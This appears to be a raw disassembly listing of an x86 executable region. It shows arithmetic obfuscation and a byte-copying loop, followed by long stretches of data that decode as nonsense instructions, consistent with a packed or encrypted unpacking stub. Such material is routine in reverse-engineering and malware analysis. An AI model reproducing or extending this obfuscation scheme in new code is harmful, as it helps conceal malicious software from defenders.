  40a699:	add    ecx,DWORD PTR [ebp-0x10]
  40a69c:	imul   ecx,ecx,0x1f80
  40a6a2:	add    ecx,0x727e
  40a6a8:	xor    ecx,0x106c92f2
  40a6ae:	mov    DWORD PTR [ebp-0x8],0x113c
  40a6b5:	mov    DWORD PTR [ebp-0xc],0x3d61
  40a6bc:	mov    DWORD PTR [ebp-0x10],0x16e9
  40a6c3:	mov    DWORD PTR [ebp-0x4],0x21aa
  40a6ca:	mov    eax,DWORD PTR [ebp-0x10]
  40a6cd:	or     eax,0x3611
  40a6d2:	add    eax,DWORD PTR [ebp-0xc]
  40a6d5:	mov    edx,DWORD PTR [ebp-0x8]
  40a6d8:	and    eax,edx
  40a6da:	mov    edx,ecx
  40a6dc:	sub    edx,eax
  40a6de:	mov    eax,DWORD PTR [ebp-0x4]
  40a6e1:	mov    esi,DWORD PTR ds:0x4226f8
  40a6e7:	mov    esi,DWORD PTR [esi+0x1cc]
  40a6ed:	add    eax,0x6772
  40a6f2:	or     eax,0x1f24
  40a6f7:	sub    eax,0x7046
  40a6fc:	xor    eax,0x497a
  40a701:	sub    esi,eax
  40a703:	mov    eax,DWORD PTR [ebp+0x8]
  40a706:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40a70d:	mov    BYTE PTR [esi+ecx*1],al
  40a710:	mov    eax,DWORD PTR [ebp-0x14]
  40a713:	mov    esi,DWORD PTR [ebp-0x18]
  40a716:	and    eax,0x2389
  40a71b:	xor    eax,0x695
  40a720:	xor    edx,edx
  40a722:	div    esi
  40a724:	lea    ecx,[ecx+eax*1-0x2413]
  40a72b:	mov    eax,DWORD PTR [ebp-0x1c]
  40a72e:	add    eax,DWORD PTR [ebp-0x20]
  40a731:	mov    edx,DWORD PTR [ebp-0x24]
  40a734:	and    eax,edx
  40a736:	mov    edx,DWORD PTR [ebp-0x28]
  40a739:	imul   eax,edx
  40a73c:	mov    edx,0xd0c8f
  40a741:	sub    edx,eax
  40a743:	cmp    ecx,edx
  40a745:	jbe    0x40a6ae
  40a74b:	push   0x2
  40a74d:	pop    eax
  40a74e:	mov    DWORD PTR [ebp-0x1c],eax
  40a751:	mov    DWORD PTR [ebp-0x20],ebx
  40a754:	mov    DWORD PTR [ebp-0x24],0x5
  40a75b:	mov    DWORD PTR [ebp-0x28],0x6686
  40a762:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40a769:	mov    DWORD PTR [ebp-0x4],eax
  40a76c:	mov    DWORD PTR [ebp+0x8],0x739a
  40a773:	mov    DWORD PTR [ebp-0xc],0xf3a
  40a77a:	xor    edx,edx
  40a77c:	mov    DWORD PTR [ebp-0x10],0x429
  40a783:	mov    eax,DWORD PTR [ebp-0x28]
  40a786:	mov    ecx,DWORD PTR [ebp-0x24]
  40a789:	sub    eax,0x175c
  40a78e:	div    ecx
  40a790:	mov    ecx,DWORD PTR [ebp-0x20]
  40a793:	xor    edx,edx
  40a795:	mov    edi,0x4db5
  40a79a:	div    ecx
  40a79c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a79f:	xor    edx,edx
  40a7a1:	div    ecx
  40a7a3:	xor    edx,edx
  40a7a5:	mov    ecx,eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	imul   ecx,ecx,0x2e01
  40a7b0:	mov    esi,DWORD PTR [ebp-0x4]
  40a7b3:	add    eax,edi
  40a7b5:	div    esi
  40a7b7:	mov    edx,DWORD PTR [ebp-0x8]
  40a7ba:	mov    esi,0x940a7
  40a7bf:	sub    ecx,0x16bea86
  40a7c5:	jmp    0x40aa5c
  40a7ca:	lds    ecx,FWORD PTR [ebp+0x709870ff]
  40a7d0:	mov    dh,0xb7
  40a7d2:	and    dh,BYTE PTR [esi+ecx*1]
  40a7d5:	sahf   
  40a7d6:	or     ebp,DWORD PTR [esi+0x66]
  40a7d9:	sar    esi,1
  40a7db:	lahf   
  40a7dc:	mov    esi,0xbec2a9be
  40a7e1:	mov    esi,0xd967bc1d
  40a7e6:	mov    ecx,0x527133cd
  40a7eb:	popf   
  40a7ec:	xor    bh,cl
  40a7ee:	fistp  WORD PTR [esi+0x5a16c272]
  40a7f4:	or     eax,DWORD PTR [edx]
  40a7f6:	loope  0x40a863
  40a7f8:	pushf  
  40a7f9:	sbb    eax,0x9e6b3bfb
  40a7fe:	push   edi
  40a7ff:	xlat   BYTE PTR ds:[ebx]
  40a800:	lods   eax,DWORD PTR ds:[esi]
  40a801:	repnz push 0xffffffec
  40a804:	outs   dx,BYTE PTR ds:[esi]
  40a805:	mov    ecx,0xfde06cb7
  40a80a:	inc    ecx
  40a80b:	dec    esi
  40a80c:	jmp    0x1c7908c
  40a811:	xchg   edx,eax
  40a812:	push   ss
  40a813:	es lock mov ebp,0x701a9bf9
  40a81a:	fs or  al,0x3b
  40a81d:	jge    0x40a855
  40a81f:	mov    esp,edi
  40a821:	pop    ebp
  40a822:	(bad)  
  40a823:	push   edx
  40a824:	xor    eax,0x99ce6aa0
  40a829:	sub    DWORD PTR [eax-0x76],ebp
  40a82c:	lods   eax,DWORD PTR ds:[esi]
  40a82d:	xchg   edi,eax
  40a82e:	sub    BYTE PTR ds:0x4195e7ec,0x30
  40a835:	scas   eax,DWORD PTR es:[edi]
  40a836:	mov    eax,0x3d8e682a
  40a83b:	push   ebx
  40a83c:	retf   0xef85
  40a83f:	xchg   esi,eax
  40a840:	int    0x7a
  40a842:	aam    0xf8
  40a844:	adc    edi,eax
  40a846:	xchg   esi,eax
  40a847:	pop    ebp
  40a848:	stos   BYTE PTR es:[edi],al
  40a849:	or     al,0x4b
  40a84b:	or     DWORD PTR ss:[ecx-0x15cc5aa7],edx
  40a852:	mov    ch,0x13
  40a854:	int3   
  40a855:	push   eax
  40a856:	sub    bh,bh
  40a858:	fcomp  QWORD PTR [ebx-0xe]
  40a85b:	pop    es
  40a85c:	mov    al,ds:0x6da26773
  40a861:	scas   al,BYTE PTR es:[edi]
  40a862:	jbe    0x40a857
  40a864:	stos   BYTE PTR es:[edi],al
  40a865:	mov    eax,0x2afc740e
  40a86a:	cmp    al,0x9f
  40a86c:	push   cs
  40a86d:	xor    al,0xdf
  40a86f:	ficomp WORD PTR [eax-0x500f584d]
  40a875:	jne    0x40a8dc
  40a877:	(bad)  
  40a878:	xor    ah,ah
  40a87a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a87b:	out    dx,eax
  40a87c:	dec    ebx
  40a87d:	xchg   edx,eax
  40a87e:	mov    al,BYTE PTR [ebp-0x11]
  40a881:	ins    BYTE PTR es:[edi],dx
  40a882:	sbb    DWORD PTR [esi-0x4b7583be],edx
  40a888:	stos   BYTE PTR es:[edi],al
  40a889:	adc    esp,DWORD PTR [ebx+edx*2-0x74]
  40a88d:	loope  0x40a8d6
  40a88f:	jg     0x40a840
  40a891:	sbb    ebx,DWORD PTR [edi]
  40a893:	jnp    0x40a904
  40a895:	inc    ecx
  40a896:	pop    ds
  40a897:	pusha  
  40a898:	xchg   ebp,eax
  40a899:	fimul  DWORD PTR [ecx+0x1f2f0abc]
  40a89f:	add    eax,0xb7c319f
  40a8a4:	fld    st(4)
  40a8a6:	(bad)  [edx+0x316afecb]
  40a8ac:	or     cl,BYTE PTR [edi-0x6c]
  40a8af:	push   edx
  40a8b0:	cmp    BYTE PTR [ebx+ebx*8],dl
  40a8b3:	sbb    al,0x1b
  40a8b5:	icebp  
  40a8b6:	dec    ecx
  40a8b7:	cs inc edi
  40a8b9:	add    dh,dl
  40a8bb:	shl    DWORD PTR [ebp-0x2f],cl
  40a8be:	jmp    0x6a070dfe
  40a8c3:	pop    edi
  40a8c4:	shr    DWORD PTR [edx+0x20],0x63
  40a8c8:	lock call 0xd8fb:0x6dd22241
  40a8d0:	xor    DWORD PTR [esi+0x60],ebp
  40a8d3:	xor    ebx,DWORD PTR [ecx]
  40a8d5:	iret   
  40a8d6:	data16 adc BYTE PTR [ebp+0x4e],ah
  40a8da:	sti    
  40a8db:	(bad)  
  40a8dc:	je     0x40a951
  40a8de:	into   
  40a8df:	mov    cl,0x2d
  40a8e1:	add    al,0xaf
  40a8e3:	fisttp DWORD PTR [eax-0x59d0c745]
  40a8e9:	fsub   QWORD PTR [ecx+0x6a]
  40a8ec:	(bad)  
  40a8ed:	jmp    0x4a79dee
  40a8f2:	int    0x32
  40a8f4:	iret   
  40a8f5:	cmp    esi,DWORD PTR [edi]
  40a8f7:	icebp  
  40a8f8:	in     eax,dx
  40a8f9:	or     BYTE PTR ds:[eax],bl
  40a8fc:	mov    eax,0x4156679f
  40a901:	and    dl,BYTE PTR [ecx]
  40a903:	ins    DWORD PTR es:[edi],dx
  40a904:	stos   DWORD PTR es:[edi],eax
  40a905:	xor    bl,BYTE PTR [ebp+eax*2-0x7e768b5f]
  40a90c:	imul   di,WORD PTR [ebx+0x46c9101f],0xffc6
  40a914:	add    al,0x8c
  40a916:	or     eax,0xe4af8f20
  40a91b:	xchg   edx,eax
  40a91c:	(bad)  
  40a91d:	push   ss
  40a91e:	jmp    0x40a8a3
  40a920:	aas    
  40a921:	adc    eax,0xfd34b8b1
  40a926:	mov    ecx,0x725ee4dd
  40a92b:	push   0x3302fa9c
  40a930:	(bad)  
  40a931:	cmp    BYTE PTR es:[ecx],cl
  40a934:	jge    0x40a97b
  40a936:	cmp    DWORD PTR [ebp+esi*8-0x2d8b311a],esi
  40a93d:	cmp    DWORD PTR [esi+0x27],0x23fe92e0
  40a944:	add    dh,BYTE PTR [ebx+0x29f261d9]
  40a94a:	jno    0x40a939
  40a94c:	data16 arpl WORD PTR [eax+eiz*2-0x1e],di
  40a951:	fisub  DWORD PTR [ebx]
  40a953:	xor    DWORD PTR [edi+ebx*2+0x71],esi
  40a957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a958:	mov    esp,0xc3b8c388
  40a95d:	lea    edx,[esi+0x79]
  40a960:	stos   DWORD PTR es:[edi],eax
  40a961:	inc    ebp
  40a962:	lea    ebp,[eax+0x6]
  40a965:	mov    bh,0x4f
  40a967:	mov    es,WORD PTR [ecx-0x5f]
  40a96a:	cmp    BYTE PTR [ebx],ah
  40a96c:	test   DWORD PTR [ebx+0x52d68e81],ebx
  40a972:	inc    esi
  40a973:	mov    dh,0xb0
  40a975:	push   ds
  40a976:	dec    BYTE PTR [eax+0x25]
  40a979:	jbe    0x40a977
  40a97b:	aas    
  40a97c:	in     al,0xb
  40a97e:	or     al,0x73
  40a980:	aaa    
  40a981:	les    eax,FWORD PTR [eax+edi*8-0x4b]
  40a985:	add    eax,0x89de3a81
  40a98a:	fdivr  DWORD PTR [eax-0x14f2d426]
  40a990:	push   edx
  40a991:	xchg   esi,eax
  40a992:	jmp    0x40aa06
  40a994:	cmp    eax,0x7131e502
  40a999:	add    ah,BYTE PTR [eax-0x6fd95242]
  40a99f:	call   0xdbd7cfbe
  40a9a4:	call   0xe7b1:0x1c6daeda
  40a9ab:	(bad)  
  40a9ac:	and    BYTE PTR [ecx],dl
  40a9ae:	mov    edi,0x5f49401a
  40a9b3:	(bad)  
  40a9b4:	fsub   st(7),st
  40a9b6:	shr    BYTE PTR [edi],1
  40a9b8:	scas   eax,DWORD PTR es:[edi]
  40a9b9:	sahf   
  40a9ba:	sti    
  40a9bb:	cmp    BYTE PTR [ebp+0x3e6d3bb8],0x54
  40a9c2:	pop    eax
  40a9c3:	add    eax,0xa9564537
  40a9c8:	fnsave [edi+0x14]
  40a9cb:	dec    ecx
  40a9cc:	xor    ah,BYTE PTR [edi+0x6e]
  40a9cf:	pop    edx
  40a9d0:	les    ebx,FWORD PTR [edi]
  40a9d2:	retf   0x66b9
  40a9d5:	push   0xffffffc6
  40a9d7:	adc    BYTE PTR [ecx],al
  40a9d9:	adc    al,0x52
  40a9db:	lea    ebp,[ecx+0x14]
  40a9de:	mov    bh,BYTE PTR [edx-0xaee8c4c]
  40a9e4:	std    
  40a9e5:	mov    al,0x86
  40a9e7:	mov    BYTE PTR [eax+0x5],dl
  40a9ea:	push   cs
  40a9eb:	call   0xf0171f7f
  40a9f0:	popf   
  40a9f1:	call   0x8685:0x3eb97a7a
  40a9f8:	xchg   ebp,eax
  40a9f9:	cmp    al,0x92
  40a9fb:	jmp    0x4108f88c
  40aa00:	xchg   ecx,eax
  40aa01:	aam    0x88
  40aa03:	lds    edi,FWORD PTR [edx-0x19]
  40aa06:	jae    0x40aa68
  40aa08:	int3   
  40aa09:	push   eax
  40aa0a:	push   ecx
  40aa0b:	dec    ebp
  40aa0c:	scas   al,BYTE PTR es:[edi]
  40aa0d:	push   0xffffffd1
  40aa0f:	out    dx,al
  40aa10:	aaa    
  40aa11:	jmp    0x97763741
  40aa16:	leave  
  40aa17:	call   DWORD PTR [eax+0x13]
  40aa1b:	es cwde 
  40aa1d:	dec    ebp
  40aa1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa1f:	call   0x3e8f1b7a
  40aa24:	retf   0xf467
  40aa27:	inc    ebp
  40aa28:	mov    fs,WORD PTR [edi+0x60e7ef25]
  40aa2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa2f:	jns    0x40aa5f
  40aa31:	inc    edi
  40aa32:	xor    DWORD PTR [ecx-0x65],0x6a8ab41f
  40aa39:	pushf  
  40aa3a:	pop    ss
  40aa3b:	fisubr WORD PTR [esi+esi*2-0x150fc9f]
  40aa42:	mov    ebp,0x28209013
  40aa47:	in     al,dx
  40aa48:	adc    al,0x35
  40aa4a:	mov    esi,0xee4f8206
  40aa4f:	test   ah,al
  40aa51:	xchg   ebx,eax
  40aa52:	jecxz  0x40aac8
  40aa54:	sub    BYTE PTR [ebx],dh
  40aa56:	stc    
  40aa57:	mov    esp,0x2b86934f
  40aa5d:	ret    0xd233
  40aa60:	div    esi
  40aa62:	mov    esi,0xdbd
  40aa67:	add    eax,esi
  40aa69:	cmp    ecx,eax
  40aa6b:	jae    0x40b05a
  40aa71:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40aa78:	mov    DWORD PTR [ebp-0x20],0x383e
  40aa7f:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40aa86:	mov    DWORD PTR [ebp-0x14],0x13cd
  40aa8d:	jmp    0x40ad24
  40aa92:	popa   
  40aa93:	clc    
  40aa94:	jnp    0x40aae9
  40aa96:	jl     0x40aaec
  40aa98:	imul   edi,eax,0x9e64741c
  40aa9e:	lods   al,BYTE PTR ds:[esi]
  40aa9f:	mov    eax,0xa5eacfee
  40aaa4:	mov    esi,0xbec2a9be
  40aaa9:	mov    esi,0xc3878d9d
  40aaae:	fsubr  QWORD PTR [edi]
  40aab0:	pop    esi
  40aab1:	mov    eax,ds:0x1e04b187
  40aab6:	or     al,0x66
  40aab8:	out    dx,eax
  40aab9:	and    al,0x5c
  40aabb:	mov    ecx,0x93d5197d
  40aac0:	es xchg ebp,eax
  40aac2:	sub    al,BYTE PTR [edi-0x66]
  40aac5:	in     al,dx
  40aac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aac7:	pushf  
  40aac8:	ja     0xe9f95a68
  40aace:	mov    ecx,ebx
  40aad0:	ds iret 
  40aad2:	jp     0x40aada
  40aad4:	icebp  
  40aad5:	pop    es
  40aad6:	cmp    al,0xf6
  40aad8:	bound  ebp,QWORD PTR [ebx]
  40aada:	fadd   QWORD PTR [edx-0x1aabf9a8]
  40aae0:	sub    eax,0xbe2fe90c
  40aae5:	cs cmp esi,edx
  40aae8:	and    eax,0xd5165700
  40aaed:	push   esi
  40aaee:	fwait
  40aaef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaf0:	add    al,0x72
  40aaf2:	xchg   ch,dl
  40aaf4:	jl     0x40aac7
  40aaf6:	pop    ecx
  40aaf7:	adc    DWORD PTR [edx+eax*2],ebx
  40aafa:	sbb    dh,al
  40aafc:	leave  
  40aafd:	outs   dx,DWORD PTR ds:[esi]
  40aafe:	(bad)  
  40aaff:	cmp    dl,dh
  40ab01:	push   cs
  40ab02:	jle    0x40ab43
  40ab04:	adc    DWORD PTR [edi],ebx
  40ab06:	push   edx
  40ab07:	sbb    DWORD PTR [esi+esi*2],esp
  40ab0a:	push   esi
  40ab0b:	cs push edi
  40ab0d:	ins    DWORD PTR es:[edi],dx
  40ab0e:	shl    BYTE PTR [ecx],cl
  40ab10:	mov    al,0x53
  40ab12:	ds adc eax,0x7130d8f2
  40ab18:	sbb    DWORD PTR [esi+eax*8-0x61],ebp
  40ab1c:	rcl    DWORD PTR [edi+ecx*8-0x32dda81f],0xd4
  40ab24:	xor    DWORD PTR [ebx],edi
  40ab26:	js     0x40aaf9
  40ab28:	mov    eax,edi
  40ab2a:	and    BYTE PTR [edx],dl
  40ab2c:	retf   0x9489
  40ab2f:	mov    esi,0x695da54f
  40ab34:	sbb    bl,ch
  40ab36:	mov    ecx,0x6b314405
  40ab3b:	shr    DWORD PTR [edx+eiz*8+0x4a83e86b],1
  40ab42:	jg     0x40aafe
  40ab44:	clc    
  40ab45:	loop   0x40abbf
  40ab47:	mov    ch,0x4
  40ab49:	sub    BYTE PTR [edi-0x2a],cl
  40ab4c:	push   ebx
  40ab4d:	sbb    esi,esp
  40ab4f:	adc    dh,ch
  40ab51:	xor    esi,esp
  40ab53:	xchg   esp,eax
  40ab54:	cmc    
  40ab55:	es inc edx
  40ab57:	jno    0x40ab48
  40ab59:	cmp    al,0x4c
  40ab5b:	push   ecx
  40ab5c:	jmp    0x2198:0xd6a40004
  40ab63:	push   ecx
  40ab64:	imul   edi,DWORD PTR [esi],0x34
  40ab67:	mov    dh,0xae
  40ab69:	xor    bh,ch
  40ab6b:	pop    ebx
  40ab6c:	and    eax,0xd994e8c
  40ab71:	js     0x40abe8
  40ab73:	mov    dl,bh
  40ab75:	push   ds
  40ab76:	jnp    0x40ab70
  40ab78:	sbb    eax,0x9b9a5194
  40ab7d:	out    0xf9,al
  40ab7f:	and    ecx,DWORD PTR [eax]
  40ab81:	and    DWORD PTR [esi+ecx*4+0x2998010c],edi
  40ab88:	scas   al,BYTE PTR es:[edi]
  40ab89:	ror    DWORD PTR [ecx],1
  40ab8b:	int    0xbb
  40ab8d:	das    
  40ab8e:	cmp    DWORD PTR [ebp+0x2e],ebx
  40ab91:	inc    ebp
  40ab92:	scas   al,BYTE PTR es:[edi]
  40ab93:	lds    esp,FWORD PTR [edx-0x3ed776dd]
  40ab99:	enter  0xac1a,0x2e
  40ab9d:	cmp    BYTE PTR [edx+0x69],dh
  40aba0:	sahf   
  40aba1:	cdq    
  40aba2:	test   al,0x81
  40aba4:	cdq    
  40aba5:	inc    ebp
  40aba6:	outs   dx,BYTE PTR ds:[esi]
  40aba7:	jbe    0x40ab84
  40aba9:	jmp    0x1f751aa8
  40abae:	inc    ebx
  40abaf:	xor    al,0x4
  40abb1:	(bad)  
  40abb3:	dec    ecx
  40abb4:	and    ch,ah
  40abb6:	js     0x40ac0a
  40abb8:	cmc    
  40abb9:	int    0x1c
  40abbb:	xchg   BYTE PTR [edx+edi*4+0x38],bl
  40abbf:	or     al,0xfd
  40abc1:	pop    esp
  40abc2:	aas    
  40abc3:	push   es
  40abc4:	mov    edx,0xe6e93bc2
  40abc9:	div    BYTE PTR [esp+eax*1]
  40abcc:	cld    
  40abcd:	inc    ebp
  40abce:	inc    ecx
  40abcf:	sub    al,0xd8
  40abd1:	jle    0x40abab
  40abd3:	dec    eax
  40abd4:	fst    QWORD PTR [ebp-0x25]
  40abd7:	daa    
  40abd8:	dec    ebx
  40abd9:	jbe    0x40ac1f
  40abdb:	or     al,0xbf
  40abdd:	neg    DWORD PTR [esi]
  40abdf:	dec    esp
  40abe0:	mov    ebx,0xa19ad89a
  40abe5:	sub    al,0xa6
  40abe7:	pop    ss
  40abe8:	jmp    0xc4f9abc2
  40abed:	cmp    ah,al
  40abef:	adc    al,0xb8
  40abf1:	pop    esp
  40abf2:	sub    BYTE PTR [ebx],0x7c
  40abf5:	xchg   BYTE PTR [edi-0x1b],dh
  40abf8:	iret   
  40abf9:	or     al,0x4d
  40abfb:	sbb    BYTE PTR [eax+eiz*4],al
  40abfe:	ja     0x40ac11
  40ac00:	aad    0x48
  40ac02:	and    eax,0x75c5f7f7
  40ac07:	aad    0x1e
  40ac09:	jo     0x40ac7f
  40ac0b:	jg     0x40abb2
  40ac0d:	jecxz  0x40ac1b
  40ac0f:	(bad)  
  40ac10:	test   al,0x1
  40ac12:	ror    cl,1
  40ac14:	add    eax,0x22aa705f
  40ac19:	ins    DWORD PTR es:[edi],dx
  40ac1a:	repz xor esi,DWORD PTR ds:[esi]
  40ac1e:	mov    ecx,ss
  40ac20:	pop    ecx
  40ac21:	inc    BYTE PTR [esp+edi*4+0x3]
  40ac25:	cld    
  40ac26:	mov    cl,0x5b
  40ac28:	add    al,BYTE PTR [esi+0xce8601e]
  40ac2e:	pusha  
  40ac2f:	mov    dh,0xbe
  40ac31:	or     ecx,DWORD PTR [ecx]
  40ac33:	(bad)  
  40ac34:	mov    fs,esp
  40ac36:	in     al,0x6a
  40ac38:	mov    dh,0x27
  40ac3a:	add    al,0x68
  40ac3c:	mov    eax,0x11baa608
  40ac41:	in     al,0x95
  40ac43:	into   
  40ac44:	ret    
  40ac45:	cwde   
  40ac46:	push   0xffffffb3
  40ac48:	or     eax,0x1159261d
  40ac4d:	sbb    eax,0x9271cf3b
  40ac52:	and    al,0x0
  40ac54:	jne    0x40ac97
  40ac56:	mov    esi,0x66b6dd10
  40ac5b:	(bad)  
  40ac5c:	aas    
  40ac5d:	pop    edi
  40ac5e:	out    0x65,eax
  40ac60:	add    al,0xf0
  40ac62:	dec    edi
  40ac63:	adc    edi,DWORD PTR [ebx+edi*8-0x7a1c141b]
  40ac6a:	into   
  40ac6b:	xor    edx,edi
  40ac6d:	add    BYTE PTR [edi+ebp*1],ch
  40ac70:	sub    edi,ebx
  40ac72:	ss scas al,BYTE PTR es:[edi]
  40ac74:	push   es
  40ac75:	out    0xec,eax
  40ac77:	push   esi
  40ac78:	jmp    0xc1a165e7
  40ac7d:	pop    ss
  40ac7e:	pop    ds
  40ac7f:	rol    BYTE PTR [esp+edi*8-0x1b2998f6],1
  40ac86:	ror    BYTE PTR [ebx],1
  40ac88:	add    al,0x27
  40ac8a:	lock mov bh,0x5e
  40ac8d:	std    
  40ac8e:	(bad)  
  40ac8f:	outs   dx,BYTE PTR ds:[esi]
  40ac90:	loop   0x40ac99
  40ac92:	test   DWORD PTR [edx+0xd316e62],ebp
  40ac98:	out    0x9c,al
  40ac9a:	dec    esp
  40ac9b:	add    bl,dh
  40ac9d:	inc    ecx
  40ac9e:	push   edx
  40ac9f:	ins    DWORD PTR es:[edi],dx
  40aca0:	stos   BYTE PTR es:[edi],al
  40aca1:	or     BYTE PTR [eax+ecx*2+0x59c51037],0xcf
  40aca9:	ja     0x40ace0
  40acab:	mov    ds:0x4e0bc961,eax
  40acb0:	mov    ch,BYTE PTR [esi-0x93d02f3]
  40acb6:	sub    eax,0xb9c32c1e
  40acbb:	cmp    eax,0x91d43889
  40acc0:	push   es
  40acc1:	stos   BYTE PTR es:[edi],al
  40acc2:	test   al,0xd0
  40acc4:	jne    0x40acac
  40acc6:	inc    edx
  40acc7:	xchg   esp,eax
  40acc8:	arpl   WORD PTR [esi+edi*8+0x23],bp
  40accc:	xchg   esi,eax
  40accd:	sbb    ah,dl
  40accf:	out    dx,al
  40acd0:	out    0xa6,al
  40acd2:	aaa    
  40acd3:	xchg   BYTE PTR ds:0x3f8bdd55,cl
  40acd9:	xchg   ebp,eax
  40acda:	xor    al,0x53
  40acdc:	out    0x8c,eax
  40acde:	loope  0x40ad3d
  40ace0:	fld    st(4)
  40ace2:	aaa    
  40ace3:	adc    ebx,esp
  40ace5:	(bad)  
  40ace6:	in     eax,0x16
  40ace8:	rol    BYTE PTR [esp+edi*4+0x3ac3ea0d],0xe2
  40acf0:	dec    ecx
  40acf1:	arpl   WORD PTR [edx+0x2d],bp
  40acf4:	leave  
  40acf5:	es test al,0x1
  40acf8:	or     eax,0x838773c2
  40acfd:	xchg   esp,eax
  40acfe:	fld    DWORD PTR [ebp-0x734f98e9]
  40ad04:	push   0x2f93b9ac
  40ad09:	loopne 0x40ace7
  40ad0b:	popf   
  40ad0c:	pop    ds
  40ad0d:	repnz mov eax,ds:0x6f98f1f
  40ad13:	pop    es
  40ad14:	test   al,0x32
  40ad16:	adc    eax,0x5b8a184d
  40ad1b:	popf   
  40ad1c:	aas    
  40ad1d:	dec    esi
  40ad1e:	push   0x22
  40ad20:	xchg   BYTE PTR [esi-0x30],al
  40ad23:	mov    ah,0x33
  40ad25:	rol    bh,cl
  40ad27:	inc    ebp
  40ad28:	call   0x40aeb4
  40ad2d:	mov    DWORD PTR [ebp-0x28],0x3224
  40ad34:	mov    eax,DWORD PTR [ebp-0x28]
  40ad37:	push   0x6
  40ad39:	pop    ebx
  40ad3a:	div    ebx
  40ad3c:	mov    edx,eax
  40ad3e:	mov    eax,ds:0x4226f8
  40ad43:	mov    eax,DWORD PTR [eax+0x1d0]
  40ad49:	sub    eax,edx
  40ad4b:	mov    edx,DWORD PTR [ebp-0x24]
  40ad4e:	jmp    0x40afe5
  40ad53:	dec    esp
  40ad54:	sub    BYTE PTR [ebp-0x49],ah
  40ad57:	test   eax,0xb93c9cb8
  40ad5c:	and    BYTE PTR [esi+0x1cee8790],bl
  40ad62:	rcl    ebp,1
  40ad64:	test   eax,0xc2a9bebe
  40ad69:	mov    esi,0x2eba2dbe
  40ad6e:	(bad)  ds:0x9f66d6b6
  40ad74:	loop   0x40ad2c
  40ad76:	mov    edi,0x810c889
  40ad7b:	add    WORD PTR [edx+0x21],dx
  40ad7f:	fcmove st,st(1)
  40ad81:	jmp    0x81c3d3a8
  40ad86:	jecxz  0x40ada4
  40ad88:	xor    DWORD PTR [esi+0x47f40c57],ecx
  40ad8e:	js     0x40ad74
  40ad90:	and    BYTE PTR [ecx],0x8c
  40ad93:	loop   0x40ad73
  40ad95:	jno    0x40adab
  40ad97:	fldenv [ebp+ebx*2+0x37]
  40ad9b:	(bad)  
  40ad9c:	cmp    al,0x99
  40ad9e:	or     edx,DWORD PTR [ebp-0x620b087f]
  40ada4:	or     eax,DWORD PTR [esi-0x79]
  40ada7:	int    0x2e
  40ada9:	mov    esi,0x31c07db6
  40adae:	stos   DWORD PTR es:[edi],eax
  40adaf:	ins    BYTE PTR es:[edi],dx
  40adb0:	and    BYTE PTR [edx+0x1b],bh
  40adb3:	mov    esp,0x946022c0
  40adb8:	add    dl,bh
  40adba:	fnstcw WORD PTR [edi+0x70512706]
  40adc0:	push   esi
  40adc1:	out    dx,al
  40adc2:	fsincos 
  40adc4:	shr    DWORD PTR [esi+eiz*2-0x13],cl
  40adc8:	iret   
  40adc9:	es test ecx,ebp
  40adcc:	inc    dh
  40adce:	mov    edi,0xeacae1f1
  40add3:	and    dl,cl
  40add5:	(bad)  
  40add6:	cmp    DWORD PTR [ebp+0x4bce3d59],esi
  40addc:	addr16 mov eax,ds:0xf260
  40ade0:	adc    esp,DWORD PTR [edx-0x12399c5]
  40ade6:	pop    ss
  40ade7:	cmp    esi,esi
  40ade9:	pop    eax
  40adea:	(bad)  
  40adeb:	push   ecx
  40adec:	iret   
  40aded:	aas    
  40adee:	pop    edi
  40adef:	add    DWORD PTR [ebp-0x5a],0x1f1c8d5b
  40adf6:	cmp    esi,DWORD PTR [edx-0xf93cca7]
  40adfc:	cmp    al,0x51
  40adfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adff:	adc    dl,cl
  40ae01:	pop    es
  40ae02:	adc    ecx,esp
  40ae04:	xchg   DWORD PTR [ecx+0xd],edi
  40ae07:	adc    eax,0x1fb6436b
  40ae0c:	scas   al,BYTE PTR es:[edi]
  40ae0d:	push   cs
  40ae0e:	jb     0x40ae4c
  40ae10:	(bad)  
  40ae11:	call   0xd7fd:0xbf973595
  40ae18:	mov    al,ds:0xaaeda22b
  40ae1d:	dec    ecx
  40ae1e:	lods   eax,DWORD PTR ds:[esi]
  40ae1f:	dec    ebp
  40ae20:	enter  0xedc2,0xaf
  40ae24:	iret   
  40ae25:	clc    
  40ae26:	leave  
  40ae27:	inc    DWORD PTR [eax+0x42]
  40ae2a:	shl    BYTE PTR [edx],cl
  40ae2c:	sbb    DWORD PTR [ebp+ecx*4+0x6cd8c3a4],esp
  40ae33:	imul   edx,DWORD PTR [ebx+0x6f],0xf3c4bf38
  40ae3a:	xlat   BYTE PTR ds:[ebx]
  40ae3b:	loope  0x40adde
  40ae3d:	andps  xmm1,XMMWORD PTR [eax]
  40ae40:	xor    eax,0x985eefd2
  40ae45:	cmp    DWORD PTR [eax+0x38f212de],ebx
  40ae4b:	imul   esi,DWORD PTR [esi],0xf25e470f
  40ae51:	sub    BYTE PTR [esp+ecx*1+0x26],ch
  40ae55:	test   al,0x78
  40ae57:	cmp    eax,0xb638dfd5
  40ae5c:	adc    BYTE PTR [ebx],cl
  40ae5e:	addr16 popa 
  40ae60:	mov    edx,0x5d114c5c
  40ae65:	sbb    cl,BYTE PTR [ecx-0x40780327]
  40ae6b:	pushf  
  40ae6c:	(bad)  
  40ae6e:	fs popa 
  40ae70:	and    esp,DWORD PTR ds:0xf2be2f8c
  40ae76:	cmp    eax,0x6ab7d60c
  40ae7b:	call   0x566d:0xa3f75012
  40ae82:	add    eax,0x3a8dc9c2
  40ae87:	scas   al,BYTE PTR es:[edi]
  40ae88:	mov    esp,0xaa7ea159
  40ae8d:	(bad)  
  40ae8e:	int    0x4d
  40ae90:	sahf   
  40ae91:	xchg   cl,ah
  40ae93:	js     0x40ae36
  40ae95:	jo     0x40aedd
